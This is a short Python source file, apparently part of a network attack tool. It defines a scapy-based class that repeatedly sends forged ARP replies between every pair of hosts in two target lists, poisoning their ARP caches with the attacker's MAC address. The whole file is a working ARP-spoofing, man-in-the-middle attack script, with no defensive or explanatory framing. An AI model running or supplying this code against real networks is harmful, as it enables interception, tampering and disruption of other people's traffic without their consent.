from scapy.all import *
import threading

class poison2():

    def __init__(self, interface, target, target2, myMAC):
        self.interface = interface
        self.target = target
        self.target2 = target2
        self.myMAC = myMAC

    def poison2(self):
        while True:
            for tar1 in self.target:
                for tar2 in self.target2:
                    if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
                        arp_packet1 = Ether(src=self.myMAC) / ARP(psrc=tar2["ip"], hwsrc=self.myMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
                        sendp(arp_packet1, iface=self.interface)
                        arp_packet2 = Ether(src=self.myMAC) / ARP(psrc=tar1["ip"], hwsrc=self.myMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
                        sendp(arp_packet2, iface=self.interface)
            time.sleep(10)